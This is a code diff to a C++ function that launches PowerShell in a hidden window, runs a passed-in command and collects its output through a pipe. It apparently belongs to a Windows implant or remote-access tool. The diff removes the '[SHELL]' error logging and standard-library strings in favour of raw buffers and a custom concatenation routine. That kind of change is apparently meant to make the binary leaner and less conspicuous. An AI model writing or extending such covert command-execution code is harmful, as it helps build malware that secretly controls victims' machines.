@@ -1,8 +1,8 @@
 #include "BaseShell.h"
-#include <iostream>
-BOOL baseShell(std::string cmd, std::string &result){
+
+BOOL baseShell(const char* cmd, char* result, size_t resultSize) {
     CHAR psCommand[2048];
-    snprintf(psCommand, sizeof(psCommand), "powershell -NoProfile -WindowStyle Hidden -Command \"%s\"", cmd.c_str());
+    snprintf(psCommand, sizeof(psCommand), "powershell -NoProfile -WindowStyle Hidden -Command \"%s\"", cmd);
 
     SECURITY_ATTRIBUTES sa;
     sa.nLength = sizeof(SECURITY_ATTRIBUTES);
@@ -12,12 +12,10 @@ BOOL baseShell(std::string cmd, std::string &result){
     HANDLE hStdOutRead, hStdOutWrite;
     if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0))
     {
-        std::cerr << "[SHELL] Error creating pipe\n";
         return FALSE;
     }
     if (!SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0))
     {
-        std::cerr << "[SHELL] Error setting handle information\n";
         CloseHandle(hStdOutRead);
         CloseHandle(hStdOutWrite);
         return FALSE;
@@ -45,18 +43,18 @@ BOOL baseShell(std::string cmd, std::string &result){
             &si,                      // Pointer to STARTUPINFO structure
             &pi))                     // Pointer to PROCESS_INFORMATION structure
     {
-        std::cerr << "[SHELL] Error creating PowerShell process\n";
         CloseHandle(hStdOutWrite);
         CloseHandle(hStdOutRead);
         return FALSE;
     }
     CloseHandle(hStdOutWrite); // Close the write end of the pipe now that the process has started
+    // Replace strncat and strlen with CustomStrCat and CustomStrLen
     CHAR buffer[4096];
     DWORD bytesRead;
     while (ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
     {
         buffer[bytesRead] = '\0';
-        result += buffer;
+        CustomStrCat(result, buffer, resultSize);
     }
     CloseHandle(hStdOutRead);
     WaitForSingleObject(pi.hProcess, INFINITE);
